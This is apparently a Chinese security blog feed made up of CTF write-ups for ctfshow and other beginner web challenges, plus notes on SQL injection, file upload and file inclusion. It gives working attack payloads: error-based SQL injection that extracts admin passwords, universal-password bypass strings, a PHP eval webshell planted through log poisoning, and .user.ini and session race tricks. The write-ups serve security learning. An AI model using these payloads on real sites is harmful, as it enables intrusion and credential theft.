table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p><strong>字段名获取</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p><strong>记录获取</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(id,<span class="number">0x7e</span>,username,<span class="number">0x7e</span>,password) <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p><strong>如果无法完全显示内容，可以使用substr,mid,substring函数截断输出，拼接获取完整数据。</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> substr(concat(password),<span class="number">1</span>,<span class="number">10</span>)) <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h3><p><strong>mysql中的约束指：对字段的限制，常用约束：主键(primary key),非空(not null),默认(default),唯一键(unique),外键(foreign key)等。</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注入位置：基于约束注入适用于注册功能的位置，实现效果：利用注入，可以注册任意用户，导致可以使用任意用户登录系统。</span><br><span class="line">当程序员或DBA在创建数据表过程中，没有对用户名称设置唯一键，并且设置varchar(num)。</span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL语句设置与取消唯一键约束</span><br><span class="line">取消唯一键 alter table admin drop unique (username)</span><br><span class="line">设置唯一键 alter table admin add unique (username)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;
# SQL注入

&lt;h2 id=&quot;产生原理&quot;&gt;&lt;a href=&quot;#产生原理&quot; class=&quot;headerlink&quot; title=&quot;产生原理&quot;&gt;&lt;/a&gt;产生原理&lt;/h2&gt;&lt;p&gt;动态交互网站，实现交互利用用户输入&lt;strong&gt;拼接到SQL执行&lt;/strong&gt;，输入不同导致返回结果不同。用户输入内容没有经过完美处理，而且构造SQL语句，直接将构造的SQL语句带入SQL语句中执行，导致SQL注入漏洞。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-03-10T13:35:58.000Z</published>
    <updated>2022-03-04T09:33:46.601Z</updated>
    
    <content type="html"><![CDATA[<p>1.前台校验，无法上传PHP文件、jpg图片，上传png图片马，抓包改后缀<br>2.我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR和PHP_INI_USER模式的 INI 设置，而且只要是在使用CGI／FastCGI模式的服务器上都可以使用.user.ini<br>auto_prepend_file和auto_append_file设置我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），<br>类似于在index.php中插入一句：require(./a.jpg);</p><p>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）</p><p>所以要求当前目录必须要有php文件getflag思路：我们上传一个.user.ini 文件设置一个文件1.jpg然后访问index.php就相当于包含了1.jpg<br>1.我们先上传.user.ini文件（当然文件名抓包之后再修改）</p><p>2.然后再上传包含的PHP文件，访问/upload/index.php自动包含</p><p>3.使用hackbar或者蚁剑寻找并读取flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.前台校验，无法上传PHP文件、jpg图片，上传png图片马，抓包改后缀&lt;br&gt;2.我们可以在.user.ini中设置php.ini中PHP_INI_PERDIR和PHP_INI_USER模式的 INI 设置，而且只要是在使用CGI／FastCGI模式的服务器上都可以使用</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yun421.top/2021/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-03-10T13:29:56.000Z</published>
    <updated>2021-10-15T09:13:28.379Z</updated>
    
    <content type="html"><![CDATA[<p>普通文件包含</p><p>常见的php伪协议大致四种</p><p>1.php://filter  主要用于读取源码<br>2.php://input  经常使用file_get_contents获取php://input内容<br>3.data://  执行命令<br>4.file://  访问本地文件系统</p><p>不能忘了convert，用于转换编码，缺少会报错</p><p>用日志包含绕过，将执行的命令插入日志中nginx日志在(/var/log/httpd/access.log)目录下</p><p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</p><p>1.简单来说，上面这个选项开启以后，上传文件，我们能够POST请求查看上传进度</p><p>2.我们在session中写入我们要执行的代码</p><p>3.用户可以自己定义Session ID，比如在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag，我们能够命名’sess_’后面的名字</p><p>4.之后要执行就要包含这个session文件</p><p>5.默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，就会清除进度信息</p><p>6.于是我们需要条件竞争来读取文件，所谓条件竞争简单来说是在执行系统命令前先执行完自己的代码，在文件上传中很常见</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;普通文件包含&lt;/p&gt;
&lt;p&gt;常见的php伪协议大致四种&lt;/p&gt;
&lt;p&gt;1.php://filter  主要用于读取源码&lt;br&gt;2.php://input  经常使用file_get_contents获取php://input内容&lt;br&gt;3.data://  执行命令&lt;br&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow Web</title>
    <link href="http://yun421.top/2021/03/10/ctfshow/"/>
    <id>http://yun421.top/2021/03/10/ctfshow/</id>
    <published>2021-03-10T13:25:16.000Z</published>
    <updated>2021-11-05T08:29:33.439Z</updated>
    
    <content type="html"><![CDATA[<p>web签到题<br><img src="https://img-blog.csdnimg.cn/20210310191001410.png" alt="在这里插入图片描述"><br>本题考查信息搜集，F12查看源代码，<img src="https://img-blog.csdnimg.cn/20210310191045713.png" alt="在这里插入图片描述"><br>base64得到flag</p><span id="more"></span><p>web2<br><img src="https://img-blog.csdnimg.cn/20210310191213355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示为最简单的sql注入，burp抓包<img src="https://img-blog.csdnimg.cn/2021031019142239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开始SQL注入测试，利用万能密码，登录成功<br>ps：PHP万能密码绕过，例如<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–<br><img src="https://img-blog.csdnimg.cn/20210310191839654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210310191903416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询数据库<img src="https://img-blog.csdnimg.cn/20210310191931594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查询数据库内数据表<img src="https://img-blog.csdnimg.cn/20210310191955965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>整齐一点显示可以添加group_concat()<img src="https://img-blog.csdnimg.cn/20210310192042681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查询字段<img src="https://img-blog.csdnimg.cn/20210310192103180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查询字段内容<img src="https://img-blog.csdnimg.cn/20210310192131724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><p>web3<br><img src="https://img-blog.csdnimg.cn/20210310202720790.png" alt="在这里插入图片描述"><br>本题考查PHP伪协议+文件包含，payload=url=php://input，burp抓包<img src="https://img-blog.csdnimg.cn/2021031020290422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 查看ctf_go_go_go文件<img src="https://img-blog.csdnimg.cn/20210310202939964.png" alt="在这里插入图片描述"><br>得到flag<br>ps：php伪协议详细<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><p>web4<br><img src="https://img-blog.csdnimg.cn/20210310203133264.png" alt="在这里插入图片描述"><br>与web3很像，测试文件包含未成功，url=../../../../../../../../../../etc/passwd，查看日志的默认目录，得到了日志文件，url=/var/log/nginx/access.log，burp抓包，编写一句话木马<?php @eval($_POST['a']);?><img src="https://img-blog.csdnimg.cn/20210310203534574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连接<img src="https://img-blog.csdnimg.cn/20210310203605757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，在www目录下发现flag.txt文件<br><img src="https://img-blog.csdnimg.cn/20210310203628939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><p>web5<img src="https://img-blog.csdnimg.cn/20210310203813380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><?php error_reporting(0);    ?> <html lang="zh-CN">       <head>    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0">    <title>ctf.show_web5</title> </head> <body> <center>    <h2>ctf.show_web5</h2>    <hr>    <h3>    </h3></center>    <?php       $flag="";       $v1=$_GET['v1'];       $v2=$_GET['v2'];       if(isset($v1) && isset($v2)){           if(!ctype_alpha($v1)){               die("v1 error");           }           if(!is_numeric($v2)){               die("v2 error");           }           if(md5($v1)==md5($v2)){               echo $flag;           }       }else{       <pre><code>       echo &quot;where is flag?&quot;;   &#125;    ?&gt;   &lt;/body&gt; &lt;/html&gt; </code><p>md5碰撞，0e开头的MD5值，默认为相等，v1为字符，v2为数值，<br>字母数字混合类（MD5值）：<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904</p><p>大写字母类：<br>QLTHNDT<br>0e405967825401955372549139051580</p><p>QNKCDZO<br>0e830400451993494058024219903391</p><p>EEIZDOI<br>0e782601363539291779881938479162</p><p>纯数字类：<br>240610708<br>0e462097431906509019562988736854<br>构造v1=QNKCDZO&amp;v2=240610708<br>得到flag</p><p>web6<br><img src="https://img-blog.csdnimg.cn/20210310204511663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burp抓包，SQL注入<br><img src="https://img-blog.csdnimg.cn/20210310204524615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现空格被过滤，用/**/绕过<img src="https://img-blog.csdnimg.cn/20210310204615418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210310204630272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查数据库名<img src="https://img-blog.csdnimg.cn/20210310204721932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询数据表名<img src="https://img-blog.csdnimg.cn/20210310204753834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询表内字段名<img src="https://img-blog.csdnimg.cn/20210310204814404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查询字段信息<img src="https://img-blog.csdnimg.cn/20210310204839508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><p>web7<br>SQL注入，构造万能密码，空格被过滤，/<strong>/绕过<br><img src="https://img-blog.csdnimg.cn/20210310205134235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burp抓包<img src="https://img-blog.csdnimg.cn/20210310205201956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>id=1/</strong>/or/<strong>/1=1/</strong>/<strong>/union/</strong>/select/<strong>/1,flag,3/</strong>/from/**/flag#<br>得到flag</p><p>web9<img src="https://img-blog.csdnimg.cn/20210310205405737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试万能密码以及过滤绕过，各种方法均没有回显，查看网站源代码， 没有提示，dir-search扫描目录，发现了一个robots.txt文件，访问发现index.phps源代码文件，确定源码泄露，访问index.phps下载源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="number">2</span>       <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;  </span><br><span class="line"><span class="number">3</span>       <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];    </span><br><span class="line"><span class="number">4</span>       <span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123; </span><br><span class="line"><span class="number">5</span>           <span class="keyword">die</span>(<span class="string">&quot;password    error&quot;</span>);  </span><br><span class="line"><span class="number">6</span>       &#125;  </span><br><span class="line"><span class="number">7</span>       <span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password=&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;  </span><br><span class="line"><span class="number">8</span>       <span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);  </span><br><span class="line"><span class="number">9</span>              <span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123; </span><br><span class="line"><span class="number">10</span>                      <span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123; </span><br><span class="line"><span class="number">11</span>                        <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="number">12</span>                        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line"><span class="number">13</span>        &#125; </span><br><span class="line"><span class="number">14</span>           &#125; </span><br><span class="line"><span class="number">15</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一行<br>$sql=”select * from user where username =’admin’ and password=’”.md5($password,true).”‘“;<br>对于函数md5(string,raw)<br>第二个参数有以下可选项：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数<br>所以只要md5加密后的16进制转化为二进制时有 ‘or’xxxx，即可构成闭合语句： username =’admin’ and password =‘ ’or ‘xxxxx’ 成功登陆<br>这里给出两个符合的字符串(参考羽师傅blog）<br>ffifdyop<br>129581926211651571912466741651878684928<br>但题目有长度限制，所以输入ffifdyop即可获取flag</p><p>web10<img src="https://img-blog.csdnimg.cn/20210310210313122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开页面点击取消按钮，自动下载了index.phps文件，查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> preg_replace(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>)!=strlen(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>)!=strlen(replaceSpecialChar(<span class="variable">$password</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆ</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>介绍一下两个sql语句：<br>1.group by：对进行查询的结果进行分组。group by后跟什么，就按什么分组<br>2.with rollup：group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计。<br>过滤空格的话用/<strong>/进行绕过就行<br>pyload: admin’/</strong>/or/<strong>/1=1/</strong>/group/<strong>/by/</strong>/password/<strong>/with/</strong>/rollup/**/#<br>在用户名框里输入这个，密码框里为空即可。因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[‘password’]<br>得到flag</p><p>web11<br><img src="https://img-blog.csdnimg.cn/20210310210705549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这一行 if($password==$_SESSION[‘password’])<br>让输入框的内容 等于 session 的值就好了<br>打开F12，找到存储，删除里面的phpsessionid<img src="https://img-blog.csdnimg.cn/20210310210806333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>session的值就是空了，那么我们再提交空密码，就会相等了，得到flag</p><p>web12<br><img src="https://img-blog.csdnimg.cn/20210310210852718.png" alt="在这里插入图片描述"><br>打开网站没有发现可用的注入点，应该不是sql注入了，直接看源码，发现提示?cmd=。<br>输入?cmd=phpinfo();有回显。<br>eval执行漏洞中我们可以查看网页的源代码，我们输入?cmd=highlight_file(“index.php”);<br>成功显示网站源码<img src="https://img-blog.csdnimg.cn/20210310211042237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>介绍一个php的函数glob();<br>glob() 函数返回匹配指定模式的文件名或目录。<br>glob(“<em>“) 匹配任意文件<br>glob(“</em>.txt”)匹配以txt为后缀的文件<br>有了这个方法我们先把当前目录下所有的文件找出来看看有没有可用的。输入?cmd=print_r(glob(“*”));打印出了如下文件<br><img src="https://img-blog.csdnimg.cn/20210310211132719.png" alt="在这里插入图片描述"><br>flag就在那个很长名字的php文件中，使用highlight_file()函数成功输出该php文件中的源码<img src="https://img-blog.csdnimg.cn/20210310211242406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;web签到题&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210310191001410.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;本题考查信息搜集，F12查看源代码，&lt;img src=&quot;https://img-blog.csdnimg.cn/20210310191045713.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;base64得到flag&lt;/p&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>攻防世界新手区题解</title>
    <link href="http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/"/>
    <id>http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/</id>
    <published>2021-03-04T06:52:33.000Z</published>
    <updated>2022-03-04T09:34:46.945Z</updated>
    
    <content type="html"><![CDATA[<p>1.view_source：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br> 本题打开网页查看源代码即得到flag<span id="more"></span><br> 2.robots：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。<br> 本题看提示robots协议，就在地址栏后面跟上robots.txt，</p><p><img src="https://img-blog.csdnimg.cn/2020121520061913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 可以看到第三行，即地址栏修改为f1ag_1s_h3re.php，<img src="https://img-blog.csdnimg.cn/20201215200757492.png" alt="在这里插入图片描述"><br>3.backup:X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！<br>本题需要知道备份文件的后缀名，常见的备份文件后缀名有: .git .svn .swp .svn .~ .bak .bash_history，尝试后发现为bak，故地址栏修改为index.php.bak<img src="https://img-blog.csdnimg.cn/20201215201219732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.cookie:X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’<br>本题需要查看cookie，F12查看源代码，选择cookie栏<img src="https://img-blog.csdnimg.cn/20201215201950773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" 